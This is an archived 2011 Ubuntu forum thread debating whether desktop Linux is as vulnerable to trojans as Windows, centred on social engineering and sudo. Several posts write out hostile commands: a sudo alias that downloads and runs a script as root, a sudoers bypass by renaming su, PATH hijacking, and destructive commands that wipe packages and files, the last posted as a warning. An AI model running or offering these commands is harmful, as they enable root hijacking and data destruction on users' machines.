---
title: "Why an Ubuntu desktop is just as insecure as a Windows desktop"
date: 2011-04-11
forum: Recurring Discussions
---

### Post by undecim on 2011-04-11
Since my previous thread was jailed quite some time ago, and I have yet to know its status, I'm starting this one, and leaving out the part that caused the last one to get jailed.

I'll start this post with a simple assertion that I will argue: In its current state, if Ubuntu (or Linux in general) were as popular as Windows and had a similar user base, more Ubuntu machines would have malware than Windows machines.

Allow me to explain.

Some time ago, while my internet connection was spotty and I had nothing better to do, I spent about 3 hours (2 of which was actually testing) writing, as a proof of concept, a small bash script. I won't reproduce it here, because that's what got my last thread jailed. I hosted the script on a website and crafted a few small seemingly innocent commands that would download and run the script, which would alias the sudo command. When run as sudo, the script runs itself as root, executes the command the user expects to run, creates the file "/etc/undecimwashere" (as proof of root access) and cleans up (i.e. fix the sudo alias and deleted itself)

That was just one man and a few hours of time. And most of that was just making sure it was impossible for the script to leave the sudo command broken.

The point I want to make with such a script is that desktop Linux distributions are NOT secure from malware. Right now malware isn't a problem only because:

1) most Linux users are smart enough to figure out what a command does before running it

2) Desktop Linux isn't very popular on the desktop yet.

However, we want reason #2 to change. And when that begins to change, so will reason #1. Hence, if we're lucky, Linux desktop security will soon become a problem.

The point that Linux separates the user from root means nothing.

First of all, most malware will not require root privileges on a Linux system. There is no need to gain privileges to open a port (above 1024), to use slowloris, or to attack an SSH server.

Second, even if a piece of malware did require root privileges (e.g. to be a more efficient node in a botnet), it is easy to acquire it when you are a user that has the ability to run commands as root, especially if the actual user has already been ignorant enough to download a trojan.

Moreover, since software on nearly every Linux distribution is open source, it is currently trivial to perfectly mimic something such as the upgrade dialogue. Personally (and I guarantee this will apply to most users, especially as Ubuntu gains popularity), I don't know any person who would think twice about entering their password to upgrade their Ubuntu system when prompted. Even if you use the CLI to upgrade, It would only take about 5 minutes to add an alias for apt-get to a trojan, or to prepend the PATH variable with with a directory full of malicious binaries.

Many of you at this point will note that most of this requires some degree of social engineering, and dismiss the problems as unsolvable because the human element will always be a security hole. However, it is because of this fact that individuals and groups who write malware for profit rely on social engineering. It's not a fool-proof method to attack a single target, but it does yield a high number of infections by targeting the most ignorant of an operating system's user base.

If Ubuntu will equal Windows in market share, it is necessary to protect these users from their own actions in order to both reduce the number of machines that will become infected in the future, and consequently make Linux malware creation less lucrative.

Windows (and available third-party applications) already implements many countermeasures to trojans, such as informing the user (e.g., the warning box that appears when you download a .exe file), blocking the most prevalent trojans with on-download virus scans, and forcing any useful malware to acquire system privileges (which is currently trivial on most Windows OSs and easy to do on any OS where the user is ignorant enough to have run a trojan in the first place)

Ubuntu does none of those things. As a Linux system, it has the potential to be secure, but as a Desktop distribution, it's ignoring the most prevalent security hole: user error.

How soon before this becomes a problem?

---

### Post by hhh on 2011-04-11
> **undecim said:**
> When run as sudo...
Well, your argument falls apart right there. The user has to enter a password to run your script. There are tons of Windows malware that install just because you navigated to a webpage.

---

### Post by malspa on 2011-04-11
> **undecim said:**
> How soon before this becomes a problem?

It isn't a problem right now, so I'm not worried.

---

### Post by Munk3y on 2011-04-11
The process you used in testing your proof of concept is flawed. You've bypassed at least two steps.

Example:

Step #1: Get malware onto computer
Step #2: Get system/user to run malware
Step #3: Trick user into compromising system

You started at step #3.

As far as your later point... Ubuntu has countermeasures against attacks, like UFW/AppArmor, etc, but I've always been of the opinion that every Operating System should include all protections (Including AntiVirus/AntiMalware software) by default.

---

### Post by Enigmapond on 2011-04-11
> **hhh said:**
> Well, your argument falls apart right there. The user has to enter a password to run your script. There are tons of Windows malware that install just because you navigated to a webpage.

I agree. Everything else following this is moot. You're argument is based on mis-information and not understanding exactly the difference between User and Root. Fail. ):P

---

### Post by 3Miro on 2011-04-11
A piece of software requires your password, if you then give the password then there is nothing the system can do. The only way to prevent you from doing damage with a sudo password is to restrict you on what you can and cannot do.

This is not "system malware" it is "social malware". There will always be people unsavvy enough to fall for the "social malware" and if Ubuntu were more popular then there would be more such crap floating around. The only defense to "social malware" is education and computer literacy.

The difference between Linux and Windows comes on the resistance to "system malware". That is if you do nothing wrong and still get infected. Without AV program, on Windows, you can get malware even without typing a password, just opening a .pdf for example, or just visiting a web-page. It is true that both systems have flaws, but the Unix architecture is build bottom up with top level of security in mind. It is generally much harder to crack as things are far more restrictive.

The BIGGEST difference between Linux and Windows is how security flaws are addressed. In an open community, as soon as a problem is found, it is fixed by a patch. Keep your Linux updated and you are safe. On the other hand, when it comes to fixing security issues, MS is useless. That is why people have to rely on third party AV software to patch the issues with Windows (issues that MS just wouldn't address).

---

### Post by 3Miro on 2011-04-11
> **Munk3y said:**
> 
As far as your later point... Ubuntu has countermeasures against attacks, like UFW/AppArmor, etc, but I've always been of the opinion that every Operating System should include all protections (Including AntiVirus/AntiMalware software) by default.

Linux does not and will not ever need AV software. There is no AV software to catch "Ubuntu viruses" and there will never be such software. Only windows and windows viruses need AV software. See earlier post. 

You already mentioned AppArmor in included as "Anti-Malware".

Here is something to read:

[https://help.ubuntu.com/community/Antivirus](https://help.ubuntu.com/community/Antivirus)

---

### Post by Rinzwind on 2011-04-11
> When run as sudo, the script runs itself as root
Here you shall fail... 

Thing is... you need to convince me and any other person to start your script with sudo. You may find 1, 2 of 3 people willing to do that. BUT you -will- run into a person that will scan you script, see what is wrong and post about it on these forums here education those people that did execute the script.

In the end you hacked into a couple of systems en need to start again with another script and another attempt to convince people to start you script. 

We all learn using Linux by making mistakes (like running you script). If in the end people are educated about what your script does I say you are doing a ***GOOD*** job with that script.


With windows you do not even need to convince people. All you need is for them to visit your website and they are toast. Plus there is no-one telling them what they did wrong and how to avoid it next time. Since the only answer you get is: ah just re-install your windows system. Windows users are kept dumb because MS wants you to spent money. You having a perfect OS comes 2nd.


Malware is effective when it can be executed on large amounts of systems without interaction by the targets. This will never happen in a Linux system.
Even with the less secure 'root' method Fedora/SUSE uses.

---

### Post by NightwishFan on 2011-04-11
Create a non-admin user for day to day work. That works like a charm. :) You can always trick a user to break their system, however if a user knows to only trust the repository they will not install any random software.

Edit: + some clever Apparmor wizardry could make this even less of a problem.

---

### Post by Rinzwind on 2011-04-11
> **Munk3y said:**
> The process you used in testing your proof of concept is flawed. You've bypassed at least two steps.

Example:

Step #1: Get malware onto computer
Step #2: Get system/user to run malware
Step #3: Trick user into compromising system

You started at step #3.
Good explanation!> 
As far as your later point... Ubuntu has countermeasures against attacks, like UFW/AppArmor, etc, but I've always been of the opinion that every Operating System should include all protections (Including AntiVirus/AntiMalware software) by default.

But here you are wrong.
We need 2 things!
1. a router so you can keep people outside your system;
2. common sense. 

There is only 1 need for AV software in Linux: if you need to scan incomming/outgoing data that is passed onto Windows(!) systems.

---

### Post by undecim on 2011-04-11
I see 3 people misunderstood the "sudo" part.

You don't run "sudo mymalware.sh"

You run a seemingly innocent command (or get hit by a firefox or flash vulnerability... there have been a lot of cross-platform flash vulnerabilities lately.) and the script aliases sudo in .bashrc.

Then, next time you run e.g. "sudo apt-get update" the script runs as root.

That's why I spent an additional 2 hours making sure my script doesn't break the sudo command.

The point here is not that I created a trojan. The point is that it's easier to do on an Ubuntu system, and the only reason Ubuntu doesn't have the trojans that Windows does is because it's more popular and tends to have a less savvy user base.

It's ridiculously easy to trick someone into running a command. I can post anonymous howtos all over the web that include the malicious command (one of my commands starts off with "echo"... Few people would give much thought to that command in the middle of a script)

This was so much easier to demonstrate when I could post the actual commands... Though that's what got my last thread jailed.

---

### Post by NightwishFan on 2011-04-11
I refuse to believe any system is entirely secure, but some are 'secure enough' for me. It might be wise in the future to do much work on an 'offline system' and keep important stuff there.


> Then, next time you run e.g. "sudo apt-get update" the script runs as root.

[QUOTE="Robert Muldoon"]Clever girl...[/QUOTE]

I think there are a few easy ways around this though. Permissions on the alias or etc.

---

### Post by undecim on 2011-04-11
> **Munk3y said:**
> The process you used in testing your proof of concept is flawed. You've bypassed at least two steps.

Example:

Step #1: Get malware onto computer
Step #2: Get system/user to run malware
Step #3: Trick user into compromising system

You started at step #3.

As far as your later point... Ubuntu has countermeasures against attacks, like UFW/AppArmor, etc, but I've always been of the opinion that every Operating System should include all protections (Including AntiVirus/AntiMalware software) by default.


I combined step 1 and 2. All it takes is running a single command, or exploiting one of the recent cross-platform flash vulnerabilities.

Number 3 will happen next time the user runs any command with sudo.

---

### Post by del_diablo on 2011-04-11
So basically your "code" runs alias over sudo and then something more to hide it?
Sorry to say so, but you still skipped to step 3.

First of: How are you going to get your user to download the software?
How are you going  to get the users to manually execute it?
And how are you going to get past user limitations?
If all it does it run alias over sudo, then you have found a zero-day, not a "actual flaw of security".
But still: How do you get the user to run this script?

---

### Post by screaminj3sus on 2011-04-11
> **hhh said:**
> Well, your argument falls apart right there. The user has to enter a password to run your script. There are tons of Windows malware that install just because you navigated to a webpage.

And in windows a uac prompt will popup...(unless some type of exploit bypasses that, which I am sure could happen to *nix too)

---

### Post by del_diablo on 2011-04-11
> **screaminj3sus said:**
> And in windows a uac prompt will popup...(unless some type of exploit bypasses that, which I am sure could happen to *nix too)

UAC pops up for everything, even in Windows 7 you will still encounter it too often for good measure.
Add on that the users are trained to click away prompts and questions.

---

### Post by 3Miro on 2011-04-11
> **undecim said:**
> I combined step 1 and 2. All it takes is running a single command, or exploiting one of the recent cross-platform flash vulnerabilities.


Flash may read data that is in your browser, how would you get it to run a bash command. Also, even if you get flash to download a file, it still needs the "+x" flag in order to run (and setting this is beyond unsavvy people's skill level).

Flash is proprietary, most of the issues with Windows security come from Windows being closed. Yes, if Linux becomes closed, it will become insecure.

---

### Post by Rinzwind on 2011-04-11
> **undecim said:**
> I see 3 people misunderstood the "sudo" part.

You don't run "sudo mymalware.sh"

You run a seemingly innocent command (or get hit by a firefox or flash vulnerability... there have been a lot of cross-platform flash vulnerabilities lately.) and the script aliases sudo in .bashrc.

Then, next time you run e.g. "sudo apt-get update" the script runs as root.

That's why I spent an additional 2 hours making sure my script doesn't break the sudo command.

The point here is not that I created a trojan. The point is that it's easier to do on an Ubuntu system, and the only reason Ubuntu doesn't have the trojans that Windows does is because it's more popular and tends to have a less savvy user base.

It's ridiculously easy to trick someone into running a command.Oh is it? I disagree. You might find 1, 2, 3 people willing to do this but you will soon run into someone that knows what is happening en that will inform all the other users!  >  I can post anonymous howtos all over the web that include the malicious command (one of my commands starts off with "echo"... Few people would give much thought to that command in the middle of a script)

This was so much easier to demonstrate when I could post the actual commands... Though that's what got my last thread jailed.

We do not care if you break 1 or 2 systems due to stupidity of the user(!) That will only result in you educating users and that is always good.

There is an example of a fork bomb on the web where you crash your computer. In the beginning I tried that command to try to understand what happens. Yes it broke my system but yes it also taught me how to look at bash commands.

The regular Joe that is not a computer wizzkid will not end up on your website. Most linux users are not of the "click and run"-type and the ones that are do not need to be protected. They need to be educated by example. Let them have their system exposed. They will get yelled at by anyone here, then padded on their back and told to not do that again. Result? You loose 1 more customer.

---

### Post by 3Miro on 2011-04-11
> **del_diablo said:**
> UAC pops up for everything, even in Windows 7 you will still encounter it too often for good measure.
Add on that the users are trained to click away prompts and questions.

+1. Everyone clicks "Yes/OK/Next/Continue" without questioning. Typing a password makes you think for a second.

Also, note this feature did not exist before Windows 7.

---

### Post by undecim on 2011-04-11
> **del_diablo said:**
> So basically your "code" runs alias over sudo and then something more to hide it?
Sorry to say so, but you still skipped to step 3.

Does no one understand that my code is not the point of this?

As I said in OP, this was a PROOF OF CONCEPT

The weakness in the security of any OS will be the user. Windows protects the ignorant because it must.

All I hear when it comes to security is that Linux separates user and root. THIS IS NOT ENOUGH. If the user has the ability to run something as root, so does everything the user runs, in one way or another.

Social engineering is how 90% of malware infects machines today. Even IE has patched most of their security vulnerabilities, and flash and plugin vulnerabilities are cross-platform (at least most are).

The only thing stopping malware from being prevalent on Ubuntu is it's lack of popularity.

But malware writers are business people. They make money selling access to these machines, and the more machines they can access, the more money they will get. Just like game writers are learning that there is money to be made by supporting Linux, so will the malware writers. This is made more so by the fact that social engineering techniques are TRIVIAL on Ubuntu systems. This only gets truer as more people discover Ubuntu and there are more and more new users who don't know the difference between echo and wget

Microsoft already understands this and has at least some degree of protection. These are features in Windows that are completely lacking in Ubuntu.

---

### Post by undecim on 2011-04-11
> **Rinzwind said:**
> The regular Joe that is not a computer wizzkid will not end up on your website. Most linux users are not of the "click and run"-type and the ones that are do not need to be protected. They need to be educated by example. Let them have their system exposed. They will get yelled at by anyone here, then padded on their back and told to not do that again. Result? You loose 1 more customer.

So you are saying that security is not a feature that should be included in Ubuntu?

Do you understand how many people are infected and do not know it? Where do you think spam comes from?

Where do you think it will come from when Windows is gone?

And again, you missed the point of OP.

Ubuntu is said to be more secure than windows. If you are relying on the user to be more intelligent, than that user will be more secure no matter what OS he/she is using.

**If Ubuntu is meant to be easy to use and targeted to the average computer user, why is it less secure for the average user?**

---

### Post by Enigmapond on 2011-04-11
In reading all this, I can understand why his previous thread was jailed. Sounds as if he is attempting to write some foolish script to do exactly what his example does and is using the forum to get it to work... :lolflag: FAIL x 2

---

### Post by 3Miro on 2011-04-11
You are giving a "proof of concept" and we are explaining that your proof fails. "what if I run such and such script on the other person's computer" does require explanation on how exactly you are going to achieve this. If you have discovered a security vulnerability, then we can patch this (blocking aliasing for sudo commands is one thing that comes to mind).

Can you give statistics to back the claim that 90% of all malware is social?

---

### Post by Rinzwind on 2011-04-11
> **screaminj3sus said:**
> And in windows a uac prompt will popup...(unless some type of exploit bypasses that, which I am sure could happen to *nix too)
If it could happen in *nix it would already have happend. Do not underestimate those hackers: I bet hacking into *nix is top priority with hackers since it would instantly make that hacker top-dog. 

But... all someone will be able to find is a bug or loophole. As soon as that bug or loophole is identified it will end up on bugzilla. And looking at a past exampe(*) it will be fixed within hours. If not sooner.

(*) someone left a password used during install inside a world readable file. Big mistake. Very big mistake. But was solved seconds after it popped on bugzilla. 


My opinion still stands: if you need the users input (downloading or starting a script) to get something compromised it is >NOT< a flaw you can attribute to Linux.

---

### Post by RiceMonster on 2011-04-11
I didn't read the entire thread, but I did notice all kinds of people using the standard "it has to run as root for it to do any damage" argument. Ok, so you need to type in a password for malware to do damage to full replaceable system files. Big deal. What about all the important data people keep in their home directory? I'd rather someone take out /usr/bin/ or /etc/ than delete or corrupt all my personal data.

> **3Miro said:**
> +1. Everyone clicks "Yes/OK/Next/Continue" without questioning. Typing a password makes you think for a second.

I see you can speak for the whole world.

> **3Miro said:**
> Also, note this feature did not exist before Windows 7.

Vista had UAC...

---

### Post by fuduntu on 2011-04-11
> **Munk3y said:**
> The process you used in testing your proof of concept is flawed. You've bypassed at least two steps.

Example:

Step #1: Get malware onto computer
Step #2: Get system/user to run malware
Step #3: Trick user into compromising system

You started at step #3.

As far as your later point... Ubuntu has countermeasures against attacks, like UFW/AppArmor, etc, but I've always been of the opinion that every Operating System should include all protections (Including AntiVirus/AntiMalware software) by default.

#1. Add this PPA for awesome gee-whiz-wow it blends cube spinny thing.

#1 (Alt). Download this script from forum x to solve problem y.

#1 (Alt #2). Nice vulnerability in that */plugin that gives me user access, alias sudo='wget myscript; sudo run my script; sudo your command here'

Wait I just covered all three.

---

### Post by 3Miro on 2011-04-11
> **RiceMonster said:**
> I didn't read the entire thread, but I did notice all kinds of people using the standard "it has to run as root for it to do any damage" argument. Ok, so you need to type in a password for malware to do damage to full replaceable system files. Big deal. What about all the important data people keep in their home directory? I'd rather someone take out /usr/bin/ or /etc/ than delete or corrupt all my personal data.

A program needs root access to try and attack another machine (usually). There are ways to protect your personal data (use encryption and keep your browser history clean for a start), but if you are specifically targeted by a hacker, this is getting hard.

The problem with Windows is that there are "automated" attacks that succeed so often and affect so many people.

---

### Post by fuduntu on 2011-04-11
> **Rinzwind said:**
> Here you shall fail... 

Thing is... you need to convince me and any other person to start your script with sudo. You may find 1, 2 of 3 people willing to do that. BUT you -will- run into a person that will scan you script, see what is wrong and post about it on these forums here education those people that did execute the script.

In the end you hacked into a couple of systems en need to start again with another script and another attempt to convince people to start you script. 

We all learn using Linux by making mistakes (like running you script). If in the end people are educated about what your script does I say you are doing a ***GOOD*** job with that script.


With windows you do not even need to convince people. All you need is for them to visit your website and they are toast. Plus there is no-one telling them what they did wrong and how to avoid it next time. Since the only answer you get is: ah just re-install your windows system. Windows users are kept dumb because MS wants you to spent money. You having a perfect OS comes 2nd.


Malware is effective when it can be executed on large amounts of systems without interaction by the targets. This will never happen in a Linux system.
Even with the less secure 'root' method Fedora/SUSE uses.

Thing is you just need to find a vulnerability that gives a user shell and then alias sudo and wait.

---

### Post by Rinzwind on 2011-04-11
> **undecim said:**
> So you are saying that security is not a feature that should be included in Ubuntu?
No I am not: sudo is Ubuntu's security> 
Do you understand how many people are infected and do not know it? Where do you think spam comes from?
Millions of windows users and flawed services. Mail is inherited flawed that opened up spam.
SPAM could effictively be removed from the world by a few simple additions to the mail relay system. 

Zero Linux users though (even windows users comming to Ubuntu know downloading software from the web and executing it is a NO-NO ;) )

> 
Where do you think it will come from when Windows is gone?

And again, you missed the point of OP.

Ubuntu is said to be more secure than windows. If you are relying on the user to be more intelligent, than that user will be more secure no matter what OS he/she is using.

**If Ubuntu is meant to be easy to use and targeted to the average computer user, why is it less secure for the average user?**-

Ubuntu IS more secure than windows. Windows uses admin as a user. Ubuntu does not. Hence it IS more secure.
Ubuntu IS more secure than Fedora: Fedora uses root as admin.

Ubuntu is more secure since you need both the user account that is sudo and that password. And you will not be able to get the password without that users consent! (be it from asking it or be it from executing a script (basically that's the same thing)). 
And as long as you require someone to download and execute something all you breach is 1 system. Not an OS! 

Thing is... it is not the OS's responsebility to guard -me- from -my- mistakes. If I let you know my sudo password I made that mistake. Not the OS.

---

### Post by fuduntu on 2011-04-11
> **del_diablo said:**
> So basically your "code" runs alias over sudo and then something more to hide it?
Sorry to say so, but you still skipped to step 3.

First of: How are you going to get your user to download the software?
How are you going  to get the users to manually execute it?
And how are you going to get past user limitations?
If all it does it run alias over sudo, then you have found a zero-day, not a "actual flaw of security".
But still: How do you get the user to run this script?

alias sudo='wget script >/dev/null 2>&1; sudo bash script; sudo your command'

---

### Post by fuduntu on 2011-04-11
> **Rinzwind said:**
> No I am not: sudo is Ubuntu's securityMillions of windows users and flawed services. Mail is inherited flawed that opened up spam.
SPAM could effictively be removed from the world by a few simple additions to the mail relay system. 

Zero Linux users though (even windows users comming to Ubuntu know downloading software from the web and executing it is a NO-NO ;) )

-

Ubuntu IS more secure than windows. Windows uses admin as a user. Ubuntu does not. Hence it IS more secure.
Ubuntu IS more secure than Fedora: Fedora uses root as admin.

Ubuntu is more secure since you need both the user account that is sudo and that password. And you will not be able to get the password without that users consent! (be it from asking it or be it from executing a script (basically that's the same thing)). 
And as long as you require someone to download and execute something all you breach is 1 system. Not an OS! 

Thing is... it is not the OS's responsebility to guard -me- from -my- mistakes. If I let you know my sudo password I made that mistake. Not the OS.

Ubuntu is less secure than Fedora, in that Ubuntu caches the sudo credential for a period of time allowing it to be reused.  Fedora requires the root user be authenticated every single time, which is more secure.

Windows does not require users to run as "Admin", and hasn't since XP (which for all intents and purposes is a dead OS).

---

### Post by fuduntu on 2011-04-11
> **3Miro said:**
> Flash may read data that is in your browser, how would you get it to run a bash command. Also, even if you get flash to download a file, it still needs the "+x" flag in order to run (and setting this is beyond unsavvy people's skill level).

Flash is proprietary, most of the issues with Windows security come from Windows being closed. Yes, if Linux becomes closed, it will become insecure.

overflow overflow overflow execute this blob

---

### Post by Rinzwind on 2011-04-11
> **fuduntu said:**
> Ubuntu is less secure than Fedora, in that Ubuntu caches the sudo credential for a period of time allowing it to be reused.  Fedora requires the root user be authenticated every single time, which is more secure.

Windows does not require users to run as "Admin", and hasn't since XP (which for all intents and purposes is a dead OS).

No Fedora is less secure when it comes to **remote access**. I should have added that in my 1st post about that. Sorry!

We all know Fedora uses root as admin account so all we need is the password after we end up on the login prompt.
We all do NOT know what Ubuntu uses as sudo account so you need both username and password when you get to the login prompt.
In this respect Ubuntu's way is more secure.

The caching of the sudo password is not a problem cuz if you can access that you do not need the sudo password anymore ;)

===

What TS poses is flawed: I say that if a user needs to input a password for someone else to gain access to that system the flaw is not with the OS but with the user.

Ubuntu is NOT flawed. Btw! Fedora is not flawed too. Just not my OS ;)

---

### Post by RiceMonster on 2011-04-11
> **Rinzwind said:**
> Ubuntu IS more secure than windows. Windows uses admin as a user. Ubuntu does not. Hence it IS more secure.
Ubuntu IS more secure than Fedora: Fedora uses root as admin.

Wrong on all parts. 

Windows does not have to be run as admin. I run Windows 7 as a limited user, and it behaves the same way a Linux distro would.

Sudo is also used to provide root access for specific commands. In Ubuntu's case, it provides **full** root access via sudo. Sudo's actual purpose is the provide root access for specific things to lock down your system. On Ubuntu, you can even log in as root easily via any of the following:

```
sudo su
sudo bash
sudo sh
```

The list will include any other shells installed on your system. Blocking those commands in /etc/sudoers does not work to prevent them, because you also need to block any command that can copy data. For example, if I block sudo su, I can get around it by doing:
```
sudo cp /sbin/su /sbin/haxors
sudo haxors
```

Up to you whether you are ok with that, but the point is, full access via sudo is really not any more secure than using root. It's a matter of asking whether you want to administrate from the same, or a different id. Your argument is based on security through obscurity, which is a poor method of security.

> **Rinzwind said:**
> Ubuntu is more secure since you need both the user account that is sudo and that password. **And you will not be able to get the password without that users consent!**

Same thing for root.

---

### Post by fuduntu on 2011-04-11
> **3Miro said:**
> A program needs root access to try and attack another machine (usually). There are ways to protect your personal data (use encryption and keep your browser history clean for a start), but if you are specifically targeted by a hacker, this is getting hard.

The problem with Windows is that there are "automated" attacks that succeed so often and affect so many people.

This isn't correct, a program does not need root access to initiate outbound connections (required to attack another machine).  In fact, it doesn't even need root access to create listening sockets.  If you have a firewall though, root access would be needed to alter it to allow the connections to be made though.

---

### Post by RiceMonster on 2011-04-11
> **Rinzwind said:**
> No Fedora is less secure when it comes to **remote access**. I should have added that in my 1st post about that. Sorry!

We all know Fedora uses root as admin account so all we need is the password after we end up on the login prompt.
We all do NOT know what Ubuntu uses as sudo account so you need both username and password when you get to the login prompt.
In this respect Ubuntu's way is more secure.

OpenSSH contains an option to disable remote root login. Just enable that, login from a different ID, and then type su. Problem solved. Do some research before you make an argument against something.

---

### Post by mikewhatever on 2011-04-11
OK, let's assume for a moment that you did write a proof of concept or whatever you say, and...?
What's the idea of posting here in the Cafee?

> 
The Community Chat area is for lighthearted and enjoyable discussions, like you might find around a water cooler at work.

Almost any non-tech-support topic may be discussed here. Discussions on religion and politics are not allowed, except for politics directly related to free and open source issues. Any topic or discussion that causes problems or drama will be closed. This area is intended for fun and community building, not arguments. Please take those elsewhere. Thanks!

---

### Post by fuduntu on 2011-04-11
> **Rinzwind said:**
> No Fedora is less secure when it comes to **remote access**. I should have added that in my 1st post about that. Sorry!

We all know Fedora uses root as admin account so all we need is the password after we end up on the login prompt.
We all do NOT know what Ubuntu uses as sudo account so you need both username and password when you get to the login prompt.
In this respect Ubuntu's way is more secure.

The caching of the sudo password is not a problem cuz if you can access that you do not need the sudo password anymore ;)

===

What TS poses is flawed: I say that if a user needs to input a password for someone else to gain access to that system the flaw is not with the OS but with the user.

Ubuntu is NOT flawed. Btw! Fedora is not flawed too. Just not my OS ;)

So, Fedora requires the root password which is different than the user password.

Ubuntu requires the user password to sudo which is the same as the user password.

Tell me again how Fedora is less secure?  Fedora requires two distinctly different passwords, where Ubuntu requires one.  I would argue that it is much less likely that the root password would be exposed than the user password, not to mention that the firewall disallows remote SSH connections by default.

Ubuntu is actually flawed.  I proved this last year.

---

### Post by NightwishFan on 2011-04-11
[https://help.ubuntu.com/community/RootSudo](https://help.ubuntu.com/community/RootSudo)

---

### Post by 1clue on 2011-04-11
Wow.

I can't believe so many people argue how unrealistic it is to get a trojan onto Linux.

It can happen, it does happen.  Security breaches can and do compromise Linux systems all the time, either due to the persistence of the attacker or through the ignorance of the system administrator.

The OP is exactly on target, except his example is ridiculously obvious and assumes an idiotic system owner with sudo access.  There are several things that make what he's saying much more realistic and much harder to defend against in the real world.

[LIST=1]
[*]You can modify one line in /etc/sudoers to enable any authenticated user to run any command on the system as root with no password.
[*]I guarantee that a bunch of people have done it, no matter how stupid it actually is to do so
[*]There are tons of malicious ways for malware to use your computer without actually harming your system.
[*]Modern malware doesn't necessarily want to harm your system, because chances are your system has nothing of significant value.
[/LIST]

Here's an exercise:

Type **echo $PATH** and see if it contains **/home/youruser/bin**.  Also check if it's in the beginning of $PATH or toward the end.  Lots of users add some user-writable directory to $PATH and add it at the beginning of the variable.  That's a security hole because the system checks the directories of $PATH in order, and executes the first example of the command it finds.  So I could have /home/1clue/bin/ls overwritten by the trojan, and it's running as me next time I try to use ls.

So, if I'm lazy and have made that change to /etc/sudoers, suddenly they can run anything they want as root.  If not, they can still run anything that's installed into a directory I can write to, and if they managed to get that ls idea to work then they can also modify $PATH to their liking for that session.  And they can add a crontab entry under my user, and they can do anything a normal user can do.

So, what can happen?  One of the common things to do is set up an IRC server or client, which either exposes itself or monitors some foreign site for a trigger.  When the trigger happens, they can either run a DDOS attack on some site or they can make a few apparently random pokes at some site they believe to hold valuable information, and then stop for awhile.  In all, the apparently random pokes made on your system match up with similar pokes from hundreds of other sites, which makes an intelligently coordinated distribute attack on some site with credit card information or whatever.  They don't need root access on your system for that, just your default access.

So some of you are asking how such a file would get on your system and how it would be executed.  That's not hard either.

How many of you have installed Linux in the first place by burning an iso file you downloaded from a random mirror site?  Do you even know that you used a mirror?  How many of you verified the md5sum of that iso file before you burned it?  How many of you paid any attention to security warnings on the site since then?  You could have installed that malware yourself when you installed Ubuntu.

One of the most common methods to introduce malware is to piggyback it onto some trusted install and then hope nobody notices.  It's usually on a mirror site somewhere because mirrors are often unattended and the security may be lower there.  If they offer a checksum of some sort for the image, you'd better use it.  That whole practice came about BECAUSE it was a problem, not in case it was a problem.

Synaptic checks files before installing so chances are pretty good those files are uncorrupted, but any application you might have installed outside that mechanism aren't so safe and you should validate them any way you can.

Finally, those pages referenced which refer to viruses and Ubuntu fail to mention trojans or even malware.  The thing that makes viruses so insignificant for Linux is only true for viruses, not for malware in general.

---

### Post by Rinzwind on 2011-04-11
> **RiceMonster said:**
> OpenSSH contains an option to disable remote root login. Just enable that, login from a different ID, and then type su. Problem solved. Do some research before you make an argument against something.
Oy. I know what I talk about. Do not assume I do not. 

Oh and just to **** you off... with this post you also admit Fedora IS less secure since you need to set an option to make your system more secure than sudo systems set by default.

*O*

BTW I have had enough of you. bye.

---

### Post by fuduntu on 2011-04-11
> **Rinzwind said:**
> Oy. I know what I talk about. Do not assume I do not. 

Oh and just to **** you off... with this post you also admit Fedora IS less secure since you need to set an option to make your system more secure than sudo systems set by default.

*O*

BTW I have had enough of you. bye.

Except that in Fedora, you have to enable SSH because it is not on by default, nor is the firewall configured to allow it to pass.

---

### Post by nothingspecial on 2011-04-11
See my sig?

Anyone can break anyone's system by posting malicious commands on the web.

There are lots mentioned in stickys here, but there are endless variations. Here are a few more to avoid.

[COLOR="Red"]This is for illustration only[/COLOR]

[SIZE="3"][COLOR="Red"]DON'T TYPE ANYTHING YOU SEE HERE [/COLOR][/SIZE]

[SIZE="4"][COLOR="Red"]IF YOU DO YOU WILL BREAK YOUR COMPUTER[/COLOR][/SIZE]

```
for j in $(dpkg --get-selections | sed 's/install//g'); do dpkg -r "$j"; done
grep -Ev 'proc' /etc/fstab > /etc/new_fstab && mv /etc/new_fstab /etc/fstab
find / -type f -exec mv '{}' ./ \;
for x in `ls`; do mv -f $x $y; y=$x; done
```

Educate users in good practice. That is the answer.

---

### Post by wojox on 2011-04-11
> **fuduntu said:**
> So, Fedora requires the root password which is different than the user password.

Ubuntu requires the user password to sudo which is the same as the user password.

Tell me again how Fedora is less secure?  Fedora requires two distinctly different passwords, where Ubuntu requires one.  I would argue that it is much less likely that the root password would be exposed than the user password, not to mention that the firewall disallows remote SSH connections by default.

Ubuntu is actually flawed.  I proved this last year.

I just read this whole thread and you beat me to my point. :p

---

### Post by RiceMonster on 2011-04-11
> **Rinzwind said:**
> Oy. I know what I talk about. Do not assume I do not. 

Oh and just to **** you off... with this post you also admit Fedora IS less secure since you need to set an option to make your system more secure than sudo systems set by default.

*O*

BTW I have had enough of you. bye.

You did this based on the assumption that remote login (ssh) is enabled. It is not even enabled in Fedora by default. You have to enable the service and then make an exception in iptables.

---

### Post by wojox on 2011-04-11
> **Rinzwind said:**
> Oy. I know what I talk about. Do not assume I do not. 

Oh and just to **** you off... with this post you also admit Fedora IS less secure since you need to set an option to make your system more secure than sudo systems set by default.

*O*

BTW I have had enough of you. bye.

ssh server doesn't come installed by default on either distro's. Just the client. You would have to enable/disable root login in either.

---

### Post by KiwiNZ on 2011-04-11
Closed for cool down

---

